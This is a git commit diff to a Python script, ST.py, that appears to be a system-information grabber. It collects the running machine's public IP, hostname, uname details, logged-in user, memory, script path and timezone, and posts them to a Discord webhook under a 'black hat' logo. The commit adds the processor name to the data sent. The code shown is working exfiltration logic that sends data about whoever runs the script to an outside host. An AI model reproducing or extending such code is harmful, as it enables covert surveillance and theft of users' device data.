c1550e28b89d7c9bbc16c746c3f367465187e119
human intellectual structure <91017265+suegdu@users.noreply.github.com>
2022-03-27 20:17:20 +0300

    platform.processor has been added

--- ST.py
+++ ST.py
@@ -8,9 +8,9 @@ from platform import uname
 import os
 import sys
 import time
-import wmi 
+import wmi
 import psutil
-import datetime 
+import datetime
 c = wmi.WMI()   
 my_system = c.Win32_ComputerSystem()[0]
 time2 = time.time()
@@ -24,7 +24,7 @@ if hasattr(sys, 'real_prefix'):
 else:
      st = False
 
-        
+proc = platform.processor() 
         
         
         
@@ -40,7 +40,7 @@ def sg():
  embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0xfff700) 
  embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
  embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
- embed.add_embed_field(name="IP :", value=ip, inline=True) 
+ embed.add_embed_field(name="Public IP :", value=ip, inline=True) 
  embed.add_embed_field(name="Hostname, Device :", value=f"{platform.node()}", inline=True)
  embed.add_embed_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(",""), inline=True) 
  embed.add_embed_field(name="User :",value=f" {os.getlogin()} ")
@@ -54,6 +54,7 @@ def sg():
  embed.add_embed_field(name="Memory :",value=f" {psutil.virtual_memory()}")
  embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
  embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
+ embed.add_embed_field(name="Processor :", value=f"**{proc}**", inline=True)
  embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
  webhook.add_embed(embed)
  response = webhook.execute()
@@ -61,4 +62,8 @@ def sg():
 
 if __name__ == "__main__":
  sg()
+
+
+
+
 
